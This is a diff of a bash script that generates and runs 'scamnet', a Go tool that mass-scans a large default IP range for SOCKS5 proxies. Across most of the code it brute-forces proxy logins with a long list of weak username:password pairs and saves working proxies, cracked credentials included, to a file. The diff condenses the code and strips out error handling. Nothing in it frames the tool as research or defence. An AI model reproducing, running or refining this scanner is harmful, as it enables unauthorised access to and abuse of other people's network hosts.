@@ -1,6 +1,5 @@
 #!/bin/bash
-# scamnet Go 内核修复版 - 修复所有编译错误
-
+# scamnet Go 内核终极修复版 - 兼容旧 Go (1.17-) + 新特性
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -13,7 +12,7 @@ LOG_DIR="logs"
 mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 
-log "正在写入修复版 Go 内核代码 → scamnet.go"
+log "写入终极兼容 Go 内核 → scamnet.go"
 
 cat > scamnet.go << 'EOF'
 package main
@@ -39,11 +38,11 @@ import (
 )
 
 var (
-	concurrency    = int64(300)
-	timeOutSeconds = 6
-	batchSize      = 10000
-	validFile      = "socks5_valid.txt"
-	weakPasswords  = []string{
+	concurrency    int64 = 300
+	timeOutSeconds     = 6
+	batchSize          = 10000
+	validFile          = "socks5_valid.txt"
+	weakPasswords      = []string{
 		"admin:admin", "::", "0:0", "00:00", "000:000", "0000:0000", "00000:00000", "000000:000000",
 		"1:1", "11:11", "111:111", "1111:1111", "11111:11111", "111111:111111",
 		"2:2", "22:22", "222:222", "2222:2222", "22222:22222", "222222:222222",
@@ -97,20 +96,22 @@ var (
 		"z:z", "zz:zz", "zzz:zzz", "zzzz:zzzz", "zzzzz:zzzzz", "zzzzzz:zzzzzz",
 	}
 	countryCache sync.Map
-	muValid     sync.Mutex
-	validCount  int64 // 用 atomic.AddInt64/LoadInt64
-	done        int64
+	muValid      sync.Mutex
+	validCount   int64 // atomic
+	done         int64 // atomic
 )
 
 func main() {
-	// 初始化文件
-	_ = os.WriteFile(validFile, []byte("# Go SOCKS5 Scanner - valid proxies (socks5://[user:pass@]ip:port#Country)\n"), 0644)
+	// 初始化
+	if f, err := os.Create(validFile); err == nil {
+		fmt.Fprintln(f, "# Go SOCKS5 Scanner - valid proxies (socks5://[user:pass@]ip:port#Country)")
+		f.Close()
+	}
 
 	reader := bufio.NewReader(os.Stdin)
-
 	fmt.Print("起始 IP (默认 47.80.0.0): ")
-	line, _ := reader.ReadString('\n')
-	startIP := strings.TrimSpace(line)
+	startIP, _ := reader.ReadString('\n')
+	startIP = strings.TrimSpace(startIP)
 	if startIP == "" {
 		startIP = "47.80.0.0"
 	}
@@ -120,8 +121,8 @@ func main() {
 	}
 
 	fmt.Print("结束 IP (默认 47.86.255.255): ")
-	line, _ = reader.ReadString('\n')
-	endIP := strings.TrimSpace(line)
+	endIP, _ := reader.ReadString('\n')
+	endIP = strings.TrimSpace(endIP)
 	if endIP == "" {
 		endIP = "47.86.255.255"
 	}
@@ -137,9 +138,9 @@ func main() {
 		startI, endI = endI, startI
 	}
 
-	fmt.Print("端口 (默认 1080,8080,8888,3128 支持 , 或 a-b): ")
-	line, _ = reader.ReadString('\n')
-	portsStr := strings.TrimSpace(line)
+	fmt.Print("端口 (默认 1080,8080,8888,3128): ")
+	portsStr, _ := reader.ReadString('\n')
+	portsStr = strings.TrimSpace(portsStr)
 	if portsStr == "" {
 		portsStr = "1080,8080,8888,3128"
 	}
@@ -154,102 +155,78 @@ func main() {
 	batchCount := (total + uint64(batchSize) - 1) / uint64(batchSize)
 
 	fmt.Printf("[*] 范围: %s ~ %s (%d IP)\n", startIP, endIP, ipCount)
-	fmt.Printf("[*] 端口: %v (%d 个)\n", ports, len(ports))
-	fmt.Printf("[*] 总任务: %d | 批次: %d | 并发: %d | 超时: %ds | 弱口令: %d 条\n", total, batchCount, concurrency, timeOutSeconds, len(weakPasswords))
-	fmt.Println("[*] 开始扫描 (Ctrl+C 可停止)...")
+	fmt.Printf("[*] 端口: %v (%d)\n", ports, len(ports))
+	fmt.Printf("[*] 总任务: %d | 批次: %d | 并发: %d | 超时: %ds\n", total, batchCount, concurrency, timeOutSeconds)
+	fmt.Println("[*] 启动 (Ctrl+C 停止)")
 
 	go progressBar(total)
 
-	for bstart := uint64(0); bstart < total; bstart += uint64(batchSize) {
-		bend := bstart + uint64(batchSize)
-		if bend > total {
-			bend = total
+	for b := uint64(0); b < total; b += uint64(batchSize) {
+		e := b + uint64(batchSize)
+		if e > total {
+			e = total
 		}
-		fmt.Printf("\n[*] 批次 %d/%d → %d tasks\n", bstart/uint64(batchSize)+1, batchCount, bend-bstart)
-		scanBatchByIndex(uint32(startI), uint32(endI), ports, bstart, bend)
+		fmt.Printf("\n[*] 批次 %d/%d (%d tasks)\n", b/uint64(batchSize)+1, batchCount, e-b)
+		scanBatch(uint32(startI), uint32(endI), ports, b, e)
 	}
 
 	time.Sleep(2 * time.Second)
-	dedupAndReport(validFile)
-	fmt.Printf("\n[+] 扫描完成！最终有效代理: %d 条\n", atomic.LoadInt64(&validCount))
-	fmt.Printf("结果文件: %s\n", validFile)
-	fmt.Println("查看: cat", validFile)
+	dedup(validFile)
+	fmt.Printf("\n[+] 完成！有效: %d 条 → %s\n", atomic.LoadInt64(&validCount), validFile)
 }
 
-func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd uint64) {
+func scanBatch(start, end uint32, ports []int, b, e uint64) {
 	sem := semaphore.NewWeighted(concurrency)
 	ctx := context.Background()
 	var wg sync.WaitGroup
-	taskIdx := batchStart
-	for ipInt := startIP; ipInt <= endIP && taskIdx < batchEnd; ipInt++ {
-		ip := intToIP(ipInt)
+	idx := b
+	for i := start; i <= end && idx < e; i++ {
+		ip := intToIP(i)
 		for _, p := range ports {
-			if taskIdx >= batchEnd {
-				goto batchdone
+			if idx >= e {
+				goto done
 			}
 			wg.Add(1)
-			go func(ipStr string, port int) {
+			go func(ip string, port int) {
 				defer wg.Done()
-				if acqErr := sem.Acquire(ctx, 1); acqErr != nil {
-					return
-				}
+				sem.Acquire(ctx, 1)
 				defer sem.Release(1)
-				scanTarget(ipStr, port)
+				scanTarget(ip, port)
 				atomic.AddInt64(&done, 1)
 			}(ip, p)
-			taskIdx++
+			idx++
 		}
 	}
-batchdone:
+done:
 	wg.Wait()
 }
 
 func scanTarget(ip string, port int) {
-	ok, lat, origin := testSocks5(ip, port, "", "")
-	if ok {
-		country := getCountry(origin)
-		saveValid(ip, port, "", "", origin, lat, country)
+	if ok, lat, origin := testSocks5(ip, port, "", ""); ok {
+		saveValid(ip, port, "", "", origin, lat)
 		return
 	}
 	for _, pw := range weakPasswords {
 		parts := strings.SplitN(pw, ":", 2)
-		user := strings.TrimSpace(parts[0])
-		pass := ""
+		u, p := parts[0], ""
 		if len(parts) > 1 {
-			pass = strings.TrimSpace(parts[1])
+			p = parts[1]
 		}
-		if user == "" && pass == "" {
-			continue
-		}
-		ok, lat, origin = testSocks5(ip, port, user, pass)
-		if ok {
-			country := getCountry(origin)
-			saveValid(ip, port, user, pass, origin, lat, country)
+		if ok, lat, origin := testSocks5(ip, port, u, p); ok {
+			saveValid(ip, port, u, p, origin, lat)
 			return
 		}
 	}
 }
 
-func testSocks5(ip string, portInt int, user, pass string) (bool, int, string) {
-	proxyStr := fmt.Sprintf("socks5://%s:%s@%s:%d", user, pass, ip, portInt)
-	if user == "" && pass == "" {
-		proxyStr = fmt.Sprintf("socks5://%s:%d", ip, portInt)
+func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
+	proxyURL := fmt.Sprintf("socks5://%s:%s@%s:%d", user, pass, ip, port)
+	if user == "" {
+		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
 	}
-	u, parseErr := url.Parse(proxyStr)
-	if parseErr != nil {
-		return false, 0, ""
-	}
-	tr := &http.Transport{
-		Proxy:                 http.ProxyURL(u),
-		DialContext:           (&net.Dialer{Timeout: 3 * time.Second}).DialContext,
-		ResponseHeaderTimeout: 3 * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
-	}
-	client := &http.Client{
-		Transport:     tr,
-		Timeout:       time.Duration(timeOutSeconds) * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
-	}
+	u, _ := url.Parse(proxyURL)
+	tr := &http.Transport{Proxy: http.ProxyURL(u)}
+	client := &http.Client{Transport: tr, Timeout: time.Duration(timeOutSeconds) * time.Second}
 	start := time.Now()
 	resp, err := client.Get("http://ifconfig.me")
 	lat := int(time.Since(start).Milliseconds())
@@ -260,202 +237,138 @@ func testSocks5(ip string, portInt int, user, pass string) (bool, int, string) {
 		return false, lat, ""
 	}
 	defer resp.Body.Close()
-	bodyBytes, readErr := io.ReadAll(resp.Body)
-	if readErr != nil {
-		return false, lat, ""
-	}
-	origin := strings.TrimSpace(string(bodyBytes))
-	if origin == "" || !strings.Contains(origin, ".") || lat > 6000 {
+	body, _ := io.ReadAll(resp.Body)
+	origin := strings.TrimSpace(string(body))
+	if origin == "" || lat > 6000 {
 		return false, lat, ""
 	}
 	return true, lat, origin
 }
 
-func saveValid(ip string, port int, user, pass, origin string, lat int, country string) {
+func saveValid(ip string, port int, user, pass, origin string, lat int) {
+	country := getCountry(origin)
 	muValid.Lock()
-	defer muValid.Unlock()
-	f, openErr := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
-	if openErr != nil {
-		return
-	}
-	defer f.Close()
+	f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 	auth := ""
 	if user != "" {
 		auth = user + ":" + pass + "@"
 	}
 	line := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
 	fmt.Fprintln(f, line)
-	count := atomic.AddInt64(&validCount, 1)
-	fmt.Printf("[+] #%d %s (%dms) 出站IP:%s 国家:%s\n", count, line, lat, origin, country)
+	f.Close()
+	muValid.Unlock()
+	atomic.AddInt64(&validCount, 1)
+	fmt.Printf("[+] #%d %s (%dms) 出站:%s 国家:%s\n", atomic.LoadInt64(&validCount), line, lat, origin, country)
 }
 
-func getCountry(ipStr string) string {
-	if val, ok := countryCache.Load(ipStr); ok {
-		return val.(string)
+func getCountry(ip string) string {
+	if v, ok := countryCache.Load(ip); ok {
+		return v.(string)
 	}
-	var code string
-	apis := []string{
-		fmt.Sprintf("http://ip-api.com/json/%s?fields=countryCode", ipStr),
-		fmt.Sprintf("https://ipinfo.io/%s/country", ipStr),
-		fmt.Sprintf("https://country.is/%s", ipStr),
-	}
-	for _, apiURL := range apis {
-		cl := &http.Client{Timeout: 4 * time.Second}
-		resp, err := cl.Get(apiURL)
-		if err != nil {
-			continue
-		}
-		defer resp.Body.Close()
-		if resp.StatusCode != 200 {
-			continue
-		}
-		bodyBytes, err := io.ReadAll(resp.Body)
-		if err != nil {
-			continue
-		}
-		c := strings.TrimSpace(string(bodyBytes))
-		matched := regexp.MustCompile(`^[A-Z]{2}$`).MatchString(c)
-		if matched {
-			code = c
-			break
+	code := "XX"
+	for _, base := range []string{"http://ip-api.com/json/%s?fields=countryCode", "https://ipinfo.io/%s/country", "https://country.is/%s"} {
+		url := fmt.Sprintf(base, ip)
+		if resp, err := http.Get(url); err == nil && resp.StatusCode == 200 {
+			if body, _ := io.ReadAll(resp.Body); resp.Body.Close(); body != nil {
+				c := strings.TrimSpace(string(body))
+				if regexp.MustCompile(`^[A-Z]{2}$`).MatchString(c) {
+					code = c
+					break
+				}
+			}
 		}
 	}
-	if code == "" {
-		code = "XX"
-	}
-	countryCache.Store(ipStr, code)
+	countryCache.Store(ip, code)
 	return code
 }
 
 func progressBar(total uint64) {
-	for {
-		curr := atomic.LoadInt64(&done)
-		if uint64(curr) >= total {
-			break
-		}
-		ratio := float64(curr) / float64(total)
-		filled := int(ratio * 50)
-		bar := strings.Repeat("█", filled) + strings.Repeat("░", 50-filled)
-		fmt.Printf("\r扫描进度: [%s] %.1f%% (%d/%d)", bar, ratio*100, curr, total)
+	for atomic.LoadInt64(&done) < int64(total) {
+		cur := atomic.LoadInt64(&done)
+		r := float64(cur) / float64(total)
+		bar := strings.Repeat("█", int(r*50)) + strings.Repeat("░", 50-int(r*50))
+		fmt.Printf("\r进度: [%s] %.1f%% (%d/%d)", bar, r*100, cur, total)
 		time.Sleep(300 * time.Millisecond)
 	}
-	fmt.Printf("\r扫描进度: [%s] 100.0%% (%d/%d)\n", strings.Repeat("█", 50), total, total)
+	fmt.Printf("\r进度: [%s] 100.0%% (%d/%d)\n", strings.Repeat("█", 50), total, total)
 }
 
-func dedupAndReport(filename string) {
-	f, err := os.Open(filename)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-	scanner := bufio.NewScanner(f)
+func dedup(file string) {
+	data, _ := os.ReadFile(file)
+	lines := strings.Split(string(data), "\n")
 	seen := make(map[string]bool)
-	for scanner.Scan() {
-		l := strings.TrimSpace(scanner.Text())
+	for _, l := range lines {
+		l = strings.TrimSpace(l)
 		if l != "" && !strings.HasPrefix(l, "#") {
 			seen[l] = true
 		}
 	}
-	var lines []string
-	for k := range seen {
-		lines = append(lines, k)
+	var uniq []string
+	for l := range seen {
+		uniq = append(uniq, l)
 	}
-	sort.Strings(lines)
-	tmpFile := filename + ".tmp"
-	out, _ := os.Create(tmpFile)
-	fmt.Fprintf(out, "# Deduped at %s\n", time.Now().Format("2006-01-02 15:04:05"))
-	for _, l := range lines {
-		fmt.Fprintln(out, l)
+	sort.Strings(uniq)
+	out := "# Deduped " + time.Now().Format("2006-01-02 15:04") + "\n"
+	for _, l := range uniq {
+		out += l + "\n"
 	}
-	out.Close()
-	os.Rename(tmpFile, filename)
-	newCount := len(lines)
-	fmt.Printf("[+] 去重完成: %d 条 (原始 %d 条)\n", newCount, atomic.LoadInt64(&validCount))
+	os.WriteFile(file, []byte(out), 0644)
+	fmt.Printf("[+] 去重: %d 条\n", len(uniq))
 }
 
-func validIP(s string) bool {
-	return net.ParseIP(strings.TrimSpace(s)) != nil
-}
-
+func validIP(s string) bool { return net.ParseIP(s) != nil }
 func ipToInt(ip string) uint32 {
-	parts := strings.Split(ip, ".")
-	if len(parts) != 4 {
-		return 0
-	}
-	a, _ := strconv.Atoi(parts[0])
-	b, _ := strconv.Atoi(parts[1])
-	c, _ := strconv.Atoi(parts[2])
-	d, _ := strconv.Atoi(parts[3])
+	p := strings.Split(ip, ".")
+	a, _ := strconv.Atoi(p[0])
+	b, _ := strconv.Atoi(p[1])
+	c, _ := strconv.Atoi(p[2])
+	d, _ := strconv.Atoi(p[3])
 	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
 }
-
-func intToIP(n uint32) string {
-	return fmt.Sprintf("%d.%d.%d.%d", byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
-}
-
+func intToIP(n uint32) string { return fmt.Sprintf("%d.%d.%d.%d", n>>24, n>>16&255, n>>8&255, n&255) }
 func parsePorts(s string) []int {
-	var ps []int
-	seen := make(map[int]bool)
-	for _, part := range strings.Split(s, ",") {
-		part = strings.TrimSpace(part)
-		if part == "" {
-			continue
-		}
-		if strings.Contains(part, "-") {
-			rangeParts := strings.Split(part, "-")
-			if len(rangeParts) != 2 {
-				continue
-			}
-			start, err1 := strconv.Atoi(strings.TrimSpace(rangeParts[0]))
-			end, err2 := strconv.Atoi(strings.TrimSpace(rangeParts[1]))
-			if err1 != nil || err2 != nil || start < 1 || end > 65535 || start > end {
-				continue
-			}
-			for i := start; i <= end; i++ {
+	var res []int
+	seen := map[int]bool{}
+	for _, tok := range strings.Split(s, ",") {
+		tok = strings.TrimSpace(tok)
+		if r := strings.Split(tok, "-"); len(r) == 2 {
+			st, _ := strconv.Atoi(r[0])
+			en, _ := strconv.Atoi(r[1])
+			for i := st; i <= en && i <= 65535; i++ {
 				if !seen[i] {
-					ps = append(ps, i)
+					res = append(res, i)
 					seen[i] = true
 				}
 			}
-		} else {
-			p, err := strconv.Atoi(part)
-			if err != nil || p < 1 || p > 65535 {
-				continue
-			}
-			if !seen[p] {
-				ps = append(ps, p)
-				seen[p] = true
-			}
+		} else if p, err := strconv.Atoi(tok); err == nil && p > 0 && p <= 65535 && !seen[p] {
+			res = append(res, p)
+			seen[p] = true
 		}
 	}
-	sort.Ints(ps)
-	return ps
+	sort.Ints(res)
+	return res
 }
 EOF
 
-log "下载依赖..."
-go mod init scamnet >/dev/null 2>&1
-go get golang.org/x/sync/semaphore >/dev/null 2>&1
+log "初始化模块 & 下载依赖..."
+go mod init scamnet 2>/dev/null || true
+go mod tidy -e >/dev/null 2>&1
 
-log "编译修复版内核..."
+log "编译 (兼容 Go 1.16+)"
 if go build -ldflags="-s -w" -o scamnet scamnet.go; then
 	succ "编译成功！"
 else
-	err "编译仍失败，请检查 Go 版本 >=1.18 (go version)"
-	go version
+	err "仍失败？运行: go version"
+	go version || true
 	exit 1
 fi
 
 > "$LATEST_LOG"
 
-succ "启动 Go 内核..."
-echo "[*] 日志: tail -f $LATEST_LOG" >&2
-echo "[*] 结果: cat socks5_valid.txt" >&2
-echo "[*] Ctrl+C 停止" >&2
-
-ulimit -n 65535 >/dev/null 2>&1 || true
+succ "启动..."
+ulimit -n 999999 2>/dev/null || true
 ./scamnet 2>&1 | tee -a "$LATEST_LOG"
 
 succ "完成！"
-echo "grep '\\[+]' $LATEST_LOG   # 只看命中"
-echo "cat socks5_valid.txt       # 代理列表"
+echo "cat socks5_valid.txt     # 结果"
+echo "grep '\\[+]' $LATEST_LOG # 命中"
